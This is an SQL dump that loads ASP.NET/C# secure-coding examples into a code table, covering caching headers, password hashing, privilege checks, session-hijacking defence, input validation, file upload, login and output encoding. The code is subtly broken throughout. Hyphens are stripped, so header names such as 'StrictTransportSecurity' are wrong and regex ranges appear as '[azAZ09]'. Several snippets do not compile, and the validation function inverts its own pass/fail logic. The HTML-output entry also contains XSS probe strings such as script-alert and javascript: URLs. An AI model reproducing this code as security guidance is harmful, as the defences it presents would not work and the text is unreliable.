	HttpContext.Current.Response.AppendHeader("Expires", "0");
	HttpContext.Current.Response.AppendHeader("CacheControl", "nocache, nostore, mustrevalidate");
	HttpContext.Current.Response.AppendHeader("Pragma", "nocache");
', 'Anti caching header', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Aggregate user controls


 Example:

   	
	/*
	In order to enforce Aggregate access control protection the best method would be to 
	define your rules by means of a database structure rather than sessions or logs.
	This is due to the fact that if the user drops his session the rating would start
	al over again. 

	TABLE users
	   
	| userID | userName | password | privilegeID |    access    | AggregateControl	|
	  
	|   1    | Admin    | Csdar323 |      1      |     TRUE     |		2322		|
	   
	|   2    | User     | Adf4fsv  |      2      |     FALSE    |		  0			|
	  
	|   3    | Guest    | dff4fKr  |      3      |     TRUE     |	     125		|	
	

	TABLE privileges
	   
	| privilegeID | privilege        | 
	
	|     1       | edit:read:delete |
	
	|     2       | edit:read        |
	
	|     3       | read             |
	
	*/
		
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.ComponentModel.DataAnnotations.Schema;
	using System.ComponentModel.DataAnnotations;
	using System.Data.SqlClient;


	namespace MvcApplication1.Models
	{
		[Table("users")]
		public class Aggregate
		{
			//Getters and setters for our user method
			[Key]
			public int userID { get; set; }
			public string userName { get; set; }
			public string password { get; set; }
			public string access { get; set; }
			public int aggregate { get; set; }
			public int privilege { get; set; }		

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new SqlConnection
			(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			//The count integer is set every time the user connects to the database to process data
			public void aggregateControl(int count)
			{
				//First we include the audit log class.
				AuditLog Log = new AuditLog();
			
				conn.Open();

				int control = 0;

				//the connection has to be reported into the log files
				Log.SetLog(Session[''userID''], "Connection to the database was made successfully", "SUCCESS", "NULL" ");

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				string query = string.Format("SELECT aggregate from users WHERE userID = @userID ");
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						control = Convert.ToInt32(oReader["aggregate"]);
					}
				}

				using (SqlCommand command = conn.CreateCommand())
				{
					//We update the aggregate table in the database in order to 
					//keep track of the number of connections the user made
					count += control;
				
					command.CommandText = "UPDATE users SET aggregate = @count WHERE userID = @userID";
					//Again we bind the parameters in order to prevent sql injections
					command.Parameters.AddWithValue("@count", count);
					command.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

					command.ExecuteNonQuery();
				}

				/*
				Each time the user accesses the database we keep track of the number of times he
				connected. Whenever the user passes a reasonable number he should be rejected 
				since he could be an attacker scraping your table contents and stealing company information
				You could a CRON job or stored procedure in your system in order to 
				clean the Aggregate column within certain time frames
				*/
				HttpContext.Current.Response.Write(control);
				if (control > 5000)
				{
					using (SqlCommand command = conn.CreateCommand())
					{

						//this breach has to be reported into the log files
						Log.SetLog(Session[''userID''], 
						"User account was locked out due to aggregate user control system", date, FAIL, HIGH");

						/*
						Whenever te reasonable number of connections the user made was surpassed we destroy all the 
						sessions to deny the user any further access to the system
						*
						HttpContext.Current.Session["authenticateUser"] = "";
						HttpContext.Current.Session.Abandon();
						HttpContext.Current.Response.Redirect("/login", true);

						/*
						Than we set his access level on his account to FALSE in order to prevent 
						him from logging in again til you did your forensics on the log files
						*/
						string access = "FALSE";
						command.CommandText = "UPDATE users SET access = @access WHERE userID = @userID";
						command.Parameters.AddWithValue("@access", access);
						command.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

						command.ExecuteNonQuery();
					}
				}
				conn.Close();
			}
		}
	}
    
	', 'Aggregate User Controls', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Password storage(salting/stretching/hashing)


 Example:


	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Security.Cryptography;

	namespace MvcApplication1.Controllers
	{
		public class hashing
		{
			public string createSalt(string password)
			{
				/*
				For generating the random salt we want to use a secure cryptographic function
				*/
				RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

				//Then we generate a random salt
				byte[] buffer = new byte[128];
				rng.GetBytes(buffer);

				Rfc2898DeriveBytes hasher = new Rfc2898DeriveBytes(password + "ALongPepperValue", buffer, 10000);
				return Convert.ToBase64String(hasher.GetBytes(25));
			}
			
			//The salt in this function is the return value of the createSalt function
			public string hashPassword(string Salt, string Password)
			{
				Rfc2898DeriveBytes Hasher = new Rfc2898DeriveBytes(Password + "ALongPepperValue",
					System.Text.Encoding.Default.GetBytes(Salt), 10000);
				return Convert.ToBase64String(Hasher.GetBytes(25));
			}
			
			//With this function we validate the password hash
			public bool Validate(string passwordHash, string saltHash, string enteredPassword)
			{
				Rfc2898DeriveBytes Hasher = new Rfc2898DeriveBytes(enteredPassword + "ALongPepperValue",
						System.Text.Encoding.Default.GetBytes(saltHash), 10000);
				return Convert.ToBase64String(Hasher.GetBytes(25)) == passwordHash;
			}
		}
	}', 'Password Storage(salting stretching hashing)', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Sandboxing


 Example:
    

    <iframe sandbox="value"> 
	
	/*
	sandbox=""  Applies all restrictions
	allowforms  Reenables form submission
	allowpointerlock  Reenables APIs
	allowpopups  Reenables popups
	allowsameorigin  Allows the iframe content to be treated as being from the same origin
	allowscripts  Reenables scripts
	allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context
	*/

	', 'Sandboxing', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Privilege based authentication


 Example:


   	/*
    For privilege based authentication we need an extra table in your database in order to write the users privileges to.

    TABLE users
        
    | userID | userName | password | privilegeID |    access	| AggregateControl	|
       
    |   1	 | Admin	| Csdar323 |	  1		 | 	   TRUE		|		2336		|
       	
    |	2	 | User		| Adf4fsv  |	  2		 |	   FALSE	|		 0			|
       
    |	3	 | Guest	| dff4fKr  |	  3		 |	   TRUE		|		135			|
       

    TABLE privileges
       
    | privilegeID | privilege 		 | 
    
    |     1	 	  | edit:read:delete |
    
    |	  2	 	  | edit:read		 |
    
    |	  3	 	  | read			 |
    

    Now instead of using roles in sessions we rather want to assign privileges to users 
    by means of a DatabaseBased Authentication system. 
    Now we can easily assign a user certain privileges for him to access.
    */
    
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Data.SqlClient;
	using System.ComponentModel.DataAnnotations;
	using System.Web.SessionState;
	using System.Text.RegularExpressions;

	namespace MvcApplication1.Controllers
	{
		public class privilegeBasedAuthentication
		{
			//Getters and setters for our user method
			[Key]
			public int userID { get; set; }
			public string username { get; set; }
			public string password { get; set; }
			public string access { get; set; }
			public string salt { get; set; }
			public int privilege { get; set; }

			//First we include the audit log class.
			auditLogs Log = new auditLogs();

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = 
			new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			public string privileges()
			{
				string privileges = "";

				conn.Open();

				//the connection has to be reported into the log files
				Log.SetLog("Null", "Connection to the database was made successfully", "SUCCESS", "NULL");

				/*
				Here we select the users privilege level from the users table
				NOTE: query has to be in one line but could not fit screen otherwise
				*/
				string query = string.Format("
				SELECT a.username, a.password, a.privilegeID, b.privilegeID, 
				b.privilege FROM users as a JOIN privileges as b ON a.privilegeID = b.privilegeID 
				WHERE a.userID =@userID and a.access=''TRUE''");
				
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						privileges = Convert.ToString(oReader["privilege"]);
					}
				}
				return privileges;
			}

			//Here we check the privileges string against the permissions needed to perform the actions
			public bool validator(string privileges, string ispermitted)
			{

				bool privileged = false;
				string[] privDB = privileges.Split('':'');
				string[] permission = ispermitted.Split('':'');

				int count = permission.Length;
				int countsuccess = 0;

				foreach (string priv in privDB)
				{
					//We count the number of times the regex hits your privilege
					Regex regex = new Regex(priv);
					if (priv != "")
					{
						Match match = regex.Match(ispermitted);
						if (match.Success)
						{
							countsuccess += 1;
						}
					}
				}

				//Whenever the count is bigger or equal to the results we know the user was permitted
				if (countsuccess >= count)
				{
					privileged = true;
					//the connection has to be reported into the log files
					Log.SetLog(Convert.ToString(System.Web.HttpContext.Current.Session["userID"]), 
					"User did have the right privileges!", "SUCCESS", "NULL");
				}else{
					//the connection has to be reported into the log files
					Log.SetLog("Null", "User did not have the right privileges!", "FAIL", "NULL");

					//Terminate session since the user tries to tamper his privileges
					Log.setCounter(3);
					privileged = false;
				}
				return privileged;
			}
		}
	}

	/*
    if ever there are new ''roles'' added to the system you can easily assign them the needed privileges without 
    having to add new roles throughout your entire system. This system takes a little more planning up ahead but 
    it enforces higher level of security.
    */
    
    
', 'Privilege Based Authentication', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Identifierbased authorization


 Example:
   

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.ComponentModel.DataAnnotations.Schema;
	using System.ComponentModel.DataAnnotations;
	using System.Data.SqlClient;


	namespace MvcApplication1.Models
	{
		[Table("profile")]
		public class users
		{
			//Getters and setters for our user method
			[Key]
			public int userID   { get; set; }
			public string name  { get; set; }
			public string email { get; set; }
			public string phone { get; set; }

			/*
			First we include the audit log class.
			For more detailed information see the Auditlog code example
			*/
			AuditLog Log = new AuditLog();

			/*
			We then do the same for aggregate user controls.
			For more detailed information see the Aggregate user control code example
			*/
			Aggregate aggregate =  new Aggregate();

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new 
			SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			//The count integer is set every time the user connects to the database to process data
			public void IdentifierBasedAuthentication(int pageID)
			{
				conn.Open();
				bool doFunction = true;

				/*
				First we validate if the incoming value is in fact an integer since we expect a page id number.
				If the incoming value is not a number we lockout the users since he tries to manipulate application operation.
				*/
				
				//see the "input validation" code example for more detailed information about this function
				if (validate.validateInput(pageID, "numeric", "Failed to get file", "HIGH") == false) { doFunction = false; }

				if (doFunction == false)
				{
					//First we log the fact we detected a tampering in the application operation
					Log.SetLog(Session[''userID''], "User tried to manipulate application operation", date, FAIL, HIGH");

					/*
					Set counter; if counter hits 3, the user''s session must be terminated.
					After 3 session terminations the user''s account must be blocked. 
					Given the high threat level, there will be immediate session termination.
					*/
					Log.Counter(3);
				}

				if (doFunction == true)
				{
					//the page retrieval has to be reported into the log files
					Log.SetLog(Session[''userID''], "Connection to the database was made successfully", date, SUCCESS, NULL");

					//We also count the connection to the database.
					aggregate.aggregateControl(1);

					/* 
					Whenever you are checking whether a user is restricted to review certain data,
					the access restrictions should be processed server side.
					The userID could be stored inside a session variable on login, and should
					be used to retrieve user data from the database when requested
					in order to verify if the user is allowed to look into that data:
					*/
					string query = string.Format("SELECT * from profile WHERE userID = @userID ");
					SqlCommand cmd = new SqlCommand(query, conn);

					//We bind the parameter in order to prevent sql injections
					cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

					//Next we read the value from the database and put it into a variable
					using (SqlDataReader oReader = cmd.ExecuteReader())
					{
						while (oReader.Read())
						{
							name  = oReader["name"].ToString();
							email = oReader["email"].ToString();
							phone = oReader["phone"].ToString();
						}
					}
				}
			}
		}
	}
	
	
', 'Identifier Based Authorization', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Enforce sequential step order (Wizzard)


 Example:
	

	//Example as used in your controller:
	bool next = true;

	//We check for form submit
	if (Request.Form["submit"] != null)
	{   
		//If values are empty we return false and destroy session in else
		if (Request.Form["value1"] == "") { next = false; }
		if (Request.Form["value2"] == "") { next = false; }

		if (next == true)
		{   
			//If all went good the session can be set for step2
			Session["stepOrder"] = "step2";
		}else{
		   Session["stepOrder"] = "";
		   Session.Abandon();
		   Response.Redirect("/Home/Index", true);
		}
	}

	//If the second form was submitted and the session was successfully set to step 2 we proceed
	if ((Request.Form["submit2"] != null) && (Session["stepOrder"] == "step2"))
	{
		if (Request.Form["value3"] == "") { next = false; }

		if (next == true)
		{
			Session["stepOrder"] = "final";
		}else{
			Session["stepOrder"] = "";
			Session.Abandon();
			Response.Redirect("/Home/Index", true);
		}
	}

	//Again we check for the new valid session for doing the final operation
	if ((Request.Form["final"] != null) && (Session["stepOrder"] == "final")) { /* Do final operation! */ }
	return View();

	/*
	If the user drops his session, he has to start over again, and since we assign different values to the same session
	we force the user to follow the sequential order because else he does not get the sessions needed to proceed. 
	*/

', 'Enforce sequential step order wizzard', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Session hijacking


 Example:


	/*
	As soon as a user logs into your application you must store his session id as wel as his
	IP address along with his userID. This information will be used later on in your application in order to
	identify possible session hijacking.

	TABLE track_sessions
	
	| TrackID | userID |		   	   SESSION 		            |     Ip address	    | 
	
	|   1     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.89	|   
	
	|   2     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.81	|
	
	|   3     | 2      | 	c80959d3ea4c166413774e45375ac2a1    |	987.65.43.21	|
	

	In order to prevent session hijacking there are a couple of defense strategies
	which combined are a hardened defense.  
	*/

	/*
	First we implement the strict transport security header, this is in order to prevent
	users from accessing your application over an unprotected connection.
	*/

	//Example of the strict transport security header:
	Response.AppendHeader("StrictTransportSecurity", "maxage=31536000");


	//If all present and future subdomains will be HTTPS:
	Response.AppendHeader("StrictTransportSecurity" maxage=31536000, "includeSubDomains");

	/*
	Recommended: If the site owner would like their domain to be included in the HSTS preload 
	list maintained by Chrome (and used by Firefox and Safari), then use:
	*/

	Response.AppendHeader("StrictTransportSecurity", "maxage=31536000", "includeSubDomains" ,"preload");

	/*
	The `preload` flag indicates the site owner''s consent to have their domain preloaded. 
	The site owner still needs to then go and submit the domain to the list. the preload list
	enforces the browser to always present your application on HTTPS even on the first time
	the user hits your application
	*/

	/*
	Then we set the httpOnly flag
	(see "HttpOnly" in the code examples for more details about implementation)
	*/
	
	/*
	Then we set the flag for session timeout
	(see "Timeout" in the code examples for more details about implementation)
	*/
	
	/*
	Then we set the session secure flag 
	(see "Secure flag" in the code examples for more details about implementation)
	*/
	
	/*
	On login we also add another cookie with a random value to the application in order to
	prevent an attacker to fixate an ASPSESSION id on your users and hijack their sessions
	(This code example can be found in the "Login functionality" for more detailed information)
	*/
	
	
	/*
	NOTE: On applications that require high level security, there should never be an
	remember me functionality implemented.
	*/


	/*
	Now imagine the scenario after the login of the user (see the "login functionality" in
	the code examples for more details). Whenever the user is logged in, the users ip address 
	and session id are also stored in the database these values are used in order to verify 
	if there are multiple users active on the same session. 
	If so, we can let the user decide to terminate the session and terminate the
	other assigned sessions.
	*/
	
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.ComponentModel.DataAnnotations.Schema;
	using System.ComponentModel.DataAnnotations;
	using System.Data.SqlClient;
	using System.Web.SessionState;


	namespace MvcApplication1.Models
	{
		[Table("users")]
		public class users
		{
			//Getters and setters for our user method
			[Key]
			public int trackingID  { get; set; }
			public int userID      { get; set; }
			public string token    { get; set; }
			public string ipaddress { get; set; }

			//First we include the audit log class.
			AuditLog Log = new AuditLog();

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new 
			SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			//The count integer is set every time the user connects to the database to process data
			public void checkSession()
			{
				if ((System.Web.HttpContext.Current.Session["authenticateUser"] != "isLoggedin") || 
				(System.Web.HttpContext.Current.Session["authenticateUser"] == ""))
				{
					HttpContext.Current.Response.Redirect("/login", true);
				}

				conn.Open();

				string query = string.Format("SELECT * from tracking WHERE userId = @userID ");
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);
			
				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						session  = oReader["session"].ToString();
						ipaddress = oReader["ipaddress"].ToString();

						if ((System.Web.HttpContext.Current.Session["ASPsessionID"].ToString() != session) && 
						(ipaddress != HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"]))
						{   
							//We log the multiple users on the system 
							Log.SetLog(Session[''userID''], "Multiple users with same session id detected", date, FAIL, MOD");

							/*
							We redirect the user to a page which alerts him as well as gives him the option to destroy the 
							multiple sessions if he does not trust them
							*/
							HttpContext.Current.Response.Redirect("/Home/multipleUsers", true);
						}
					}
				}
			}
		}
	}    

	/*
	the only thing left to do now is to update your track_sessions table by inserting
	the ipaddress, sessionID and userID if you want to accept the other sessions as valid.
	Otherwise the user just has to terminate his current session in order to lock out the
	other sessions.
	*/



', 'Preventing Session Hijacking', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Charsets


 Example:


	/*
    In order to set the "Charsets" header you''ll have to add the 
    following code to the head of your application, the following code could be used in your controller 
    for by example, text/html:
    */
    
    Response.AppendHeader("ContentType: text/html", "charset=utf8"); 
    
	/*
	In your classes you can use the following code:
	*/
	
	HttpContext.Current.Response.AppendHeader("ContentType: text/html", "charset=utf8"); 
	

	/*
	Or directly into your html markup:
	*/
	
	<meta httpequiv="ContentType" content="text/html; charset=utf8">
	


	', 'Charsets', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Content type headers


 Example:


    /*
    In order to set the Contenttype header, you''ll have to add the following 
    code to the head of your application, the following code could be used in your controller:
    */
    
    Response.AppendHeader("ContentType:text/html", "charset=UTF8"); 

	/*
	In your classes you can use the following code:
	*/
	
	HttpContext.Current.Response.AppendHeader("ContentType:text/html", "charset=UTF8");
	

	


	', 'Content Type Headers', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XML injection prevention 


 Example:

   		
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;
	using System.IO;
	using System.Xml;

	namespace MvcApplication1.Controllers
	{
		public class storeXML
		{
			public void storeFunction(string name, string lastName, string gender)
			{
				/*
				First we import our inputvalidation control class. for more detailed information about 
				input validation check the code examples for "Input validation" & "Single input validation".
				*/
				inputValidationControl validate = new inputValidationControl();

				bool doFunction = true;
				//If the function returns false, we do not execute the function
				//see the "input validation" code example for more detailed information about this function
				if (validate.validateInput(name, "alphanumeric", "Invalid userinput name", "HIGH") == false)     { doFunction = false; }
				if (validate.validateInput(lastName, "alphanumeric", "Invalid userinput name", "HIGH") == false) { doFunction = false; }
				if (validate.validateInput(gender, "alphanumeric", "Invalid userinput name", "HIGH") == false)    { doFunction = false; }

				if (doFunction == true)
				{
					//Only after validation we proceed to the XMLwriter class where we insert the parameters
					using (XmlWriter writer = XmlWriter.Create(@"C:\Users\Public\xml\register.xml"))
					{
						writer.WriteStartElement("person");
						writer.WriteElementString("name", name);
						writer.WriteElementString("lastname", lastName);
						writer.WriteElementString("gender", gender);
						writer.WriteEndElement();
						writer.Flush();
					}
				}
			}
		}
	}

	/*
	Now we prevented malicious userinput from coming into your XML file.
	NOTE: Do not forget to also properly encode your input as a last line of defense, 
		  also In this example the XmlReader disables external entities by default.
		  If you should choose another parser make sure your parser disables these entities 
		  in order to prevent XXE injections.
	*/
          

    


', 'XML Injection Prevention', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Single input validation control


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;

	namespace MvcApplication1.Controllers
	{
		public class inputvalidation
		{

			public bool validateInput(string input, string type, string logMessage, string threatLevel)
			{
				/*
				Than we want to filter the filenames for expected values. For this example we use only az/09
				Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.           
				*/

				string validator = "";
		   
				switch (type)
				{
					case "alphanumeric":
						validator = "^[azAZ09]+$";                  
						break;
					case "numeric":
						validator = "^[09]*$";
						break;
				}
			
				Regex regex = new Regex(validator);
				bool validate = false;

				Match match = regex.Match(input);
				if (match.Success)
				{
					//If there was a match this function returns false
					validate = true;

					//this breach has to be reported into the log files
					Log.SetLog(Session[''userID''], logMessage, date, "FAIL", threatLevel);

					/*
					Set counter; if counter hits 3, the user''s session must be terminated.
					After 3 session terminations the user''s account must be blocked.
					For detailed information see the "Audit logs" in code examples.
					*/

					Log.count(1);
				}else{
					Log.SetLog(Session[''userID''], logMessage, date(), "SUCCESS", "NULL");
				}
				return validate;
			}
		}
	}

	//Usage:
	if(validate.validateInput(Convert.ToString(employeeID), "numeric", "input validation", "HIGH") == false) 
	{ 
		continueFunction = false; 
	}
	', 'Single input validation control', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('File upload


 Example:
	
	
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;
	using System.IO;
	using System.Xml;

	namespace MvcApplication1.Controllers
	{ 
		public class auditLogs
		{
			private bool continueFunction = true;
			validation validate = new validation();

			//We check for form submit
			public void upload(HttpPostedFileBase file)
			{
				//We get the filename for doing different types of tests on it
				string test = file.FileName;

				/*
				First we check if the value is alphanumeric only to prevent uploading out of intended directory, 
				as wel as other injections
				*/
				if (validate.validateInput(test, "alphanumeric", "validation failed", "HIGH") == false)
				{
					continueFunction = false;
				}

				/*
				The next step would be checking if the file contains the right extension in order to prevent
				a user from uploading files which could be used to harm your system. in this example 
				we check if the last extension found in the file name is a jpg or a png. whenever
				an application just regexes for the extension an attacker could
				bypass the check by uploading an file like: "filename.jpg.php".
				*/
				string[] StrSpli = test.Split(''.'');
				int count = StrSpli.Count()  1;

				if ((StrSpli[count] != "png") && (StrSpli[count] != "jpg"))
				{
					continueFunction = false;
					HttpContext.Current.Response.Write("end of function");
				}

				/*
				 If the file came through all the different checks, it is time to upload the file to your system. 
				 */
				if (continueFunction == true)
				{
					if (file != null && file.ContentLength > 0)
					{

						try
						{
							// extract only the filename
							var fileName = Path.GetFileName(file.FileName);

							// The location of stored files should always be outside of your root
							var path = Path.Combine(@"C:\Users\Public\xml", fileName);
							file.SaveAs(path);
						}
						catch{
							HttpContext.Current.Response.Write("File did not upload!");
						}
					}
				}else{
					HttpContext.Current.Response.Write("end of function we returned false");
				}

				/*
				Now we check the uploaded file for the right mimetype
				We do this after the upload instead of checking the content type header since that header 
				can easily manipulated by an attacker. 
				*/

				string mimeType = "application/unknown";
				string ext = System.IO.Path.GetExtension(@"C:\Users\Public\xml\"+test+"").ToLower();

				Microsoft.Win32.RegistryKey regKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(ext);

				if (regKey != null && regKey.GetValue("Content Type") != null)
				{
					mimeType = regKey.GetValue("Content Type").ToString();
				}

				if (mimeType != "image/jpeg") 
				{   
					//If the mimetype is not valid we delete the file from the system.
					System.IO.File.Delete(@"C:\Users\Public\xml\"+test+"");
				}
			}
		}
	}
', 'File Upload', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Login functionality


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Data.SqlClient;
	using System.ComponentModel.DataAnnotations;
	using System.Web.SessionState;

	namespace MvcApplication1.Controllers
	{
		public class login
		{
			//Getters and setters for our user method
		    [Key]
			public int userID { get; set; }
			public string username { get; set; }
			public string password { get; set; }
			public string access { get; set; }
			public string salt { get; set; }
			public int privilege { get; set; }

			//First we include the audit log class.
			auditLogs Log = new auditLogs();

			//Second we include the password hash.
			hashing hash = new hashing();

			//Third we include the random password/token class.
			randomizer CSRF = new randomizer();

			//Last we include the random inputvalidation class.
			inputvalidation validate = new inputvalidation();

			public bool loginUser()
			{
				//Here we connect to the database by means of a connection string as configured in the web.config
				SqlConnection conn = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

				bool loggedin = false;
            	string passwordHash = "";
            	string userId = "";
				conn.Open();

				//we also validate the username input, if it was bad we empty the string:
				if (validate.validateInput(username, "alphanumeric", "Error in username", "LOW", 0) != true) { username = ""; }

				//Here we select the user from the users table
				string query = string.Format("SELECT * from users WHERE username = @name ");
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@name", username);

				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						username = Convert.ToString(oReader["username"]);
						passwordHash = Convert.ToString(oReader["password"]);
						salt = Convert.ToString(oReader["salt"]);
						userId = Convert.ToString(oReader["userID"]);
					}
				}

				/*
				We validate the password see "Password storage(salting stretching hashing)" in the code examples
				for more detailed information:
				*/
				if (hash.Validate(passwordHash, salt, password) == true)
				{
					/*
					This is is to prevent session fixation, after login we create a new cookie which
					we than use to authenticate. This value can not be fixated since it is set after 
					login.
				 
					create a a new GUID and save into the session:
					*/

					string guid = Guid.NewGuid().ToString();
					HttpContext.Current.Session["AuthToken"] = guid;

					// now create a new cookie with this guid value
					HttpContext.Current.Response.Cookies.Add(new HttpCookie("AuthToken", guid));

					//the connection has to be reported into the log files
					Log.SetLog("Null", "login was OK!", "SUCCESS", "NULL");

					/*
					Now we create a random value for our CSRF tokens. See "Random password/token generation" in
					the code examples for more detailed information:
					*/
					string CSRftoken = CSRF.generate(25);
					System.Web.HttpContext.Current.Session["CSRF"] = CSRftoken;

					//Set an accessor session.
					System.Web.HttpContext.Current.Session["Authenticated"] = "access";

					/*
					Put id in a session for query identifier based authentication
					See "identifier based authentication" code example for more information
					 */
					System.Web.HttpContext.Current.Session["userID"] = userId;

					loggedin = true;
				}else{
					//the connection has to be repported into the log files
					Log.SetLog("null", "Login failed!", "FAIL", "NULL");
					loggedin = false;
					HttpContext.Current.Response.Redirect("/login", true);
				}
				return loggedin;
			}

			//In this method we do a check if the sessions are ok
			public void checkSession()
			{
				//We use this try catch for whenever the cookie is dropped
				try
				{   
					//Check sessions and cookies to see if they match
					if (!HttpContext.Current.Session["AuthToken"].ToString().Equals(
						HttpContext.Current.Request.Cookies["AuthToken"].Value)
						|| (HttpContext.Current.Session["Authenticated"] != "access"))
					{
						HttpContext.Current.Response.Redirect("/login", true);
					}
				}
				catch (NullReferenceException e){
					if (e.Source != null)
					{   
						HttpContext.Current.Response.Redirect("/login", true);
						HttpContext.Current.Session["Authenticated"] = "";
						HttpContext.Current.Session.Clear();
						HttpContext.Current.Session.Abandon();
						HttpContext.Current.Session.RemoveAll();
					}
				}
			}
		}
	}

', 'Login functionality', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Disable directory listing


 Example:


		<configuration>
			<location path="Secured">
			<system.webServer>
				<directoryBrowse enabled="false" />
			</system.webServer>
			</location>
		</configuration>

		this example applies to IIS 7+, for IIS 6 you''ll have to do it from IIS Manager




	
', 'Disable Directory Listing', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('HTML output


 Example:


	/*
	Whenever user input is displayed in the application all user input should be properly escaped 
	to prevent XSS injections.

	The C razor engine encodes userinput by default whenever this is not disabled in the web.config
	when outputted on screen, BUT you should get used to putting your variables in encoding functions
	and make this a habit simply "assuming" your input will be encoded properly is a jack in the box waiting to
	pop out and bite you in the ....as you will find out when you read on
	*/

	/*
	This escaping is used whenever you put the code straight into the html like:
	<span>YOUR USERINPUT</span>
	The attack bellow will now be outputted as,
	&lt;script&gt;alert(1337);&lt;/script&gt;
	*/
	ViewBag.html = HttpUtility.HtmlEncode("<script>alert(1337);</script>");

	/*
	This next encoding method is used for whenever you are allowing userinput into 
	html attributes.
	The attack below will now be outputted as:
	onload=&amp;39;alert(1337)&amp;39;
	*/
	ViewBag.htmlatr = HttpUtility.HtmlAttributeEncode("onload=''alert(1337);''");

	/*
	Whenever parameters are rendered via JavaScript your application will detect normal injections
	in the first instant. But your application still remains vulnerable to JavaScript encoding which will not
	be detected by the ASP.NET encoder. You MUST use the JavaScriptStringEncode function, any other 
	escaping function still leaves your code vulnerable
	*/
	ViewBag.java = HttpUtility.JavaScriptStringEncode(@"""\x3Cscript\x3Ealert(12);\x3C\x2Fscript\x3E""");
   
	/*
	Whenever a user can submit an link/AHREF in your application you must solely depend upon the
	"HttpUtility.UrlEncode" method since an attacker could otherwise inject the href with an XSS
	that looks like this "javascript:alert("XSS");" whenever a victim now clicks the link this XSS
	will be executed in his browser.
	*/ 
	ViewBag.url = HttpUtility.UrlEncode("JavaScript:alert(234);");

	/*
	Security consists of different layers of protection in order to guarantee the integrity
	of your application. This means that the value displayed from the database/user should
	already be sanitized before being processed in order to prevent XSS.
	
	As an example, what do you do when you expect a numeric value from your application?
	
	EXACTLY you first sanitize the userinput by means of an input validation method like:
	See the "input validation" class for the entire example!
	*/

	inputvalidation validate = new inputvalidation();
	string userinput = "when this string is evil the application will block operation!";
	if(validate.validateInput(userinput, "numeric", "Unexpected userinput", "HIGH", 3)== false)
	{ /* Cancel operation of your application */ }

	/*
	In this example the application cancelled the request by means of simple validation.
	*/', 'HTML Output', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Disable Directory Listing 


 Example:


